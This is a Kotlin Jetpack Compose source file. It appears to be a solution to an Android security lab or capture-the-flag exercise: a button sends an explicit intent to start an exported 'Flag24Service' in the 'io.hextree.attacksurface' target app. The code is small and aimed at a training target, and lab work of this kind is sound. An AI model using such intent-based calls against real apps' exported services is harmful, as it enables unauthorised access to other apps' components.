package com.example.myapplication

import android.content.ComponentName
import android.content.Intent
import android.util.Log
import androidx.compose.material3.Button
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext
import androidx.core.content.ContextCompat

@Composable
fun StartService24(modifier: Modifier = Modifier) {

    val context = LocalContext.current

    Button(
        onClick = {
            val intent = Intent().apply {
                component = ComponentName(
                    "io.hextree.attacksurface",
                    "io.hextree.attacksurface.services.Flag24Service"
                )
                action = "io.hextree.services.START_FLAG24_SERVICE"
            }

            try {
                ContextCompat.startForegroundService(context, intent)
                Log.d("FLAG24", "Service started")
            } catch (e: Exception) {
                Log.e("FLAG24", "Failed to start service", e)
            }
        }
    ) {
        Text("Start Flag24")
    }
}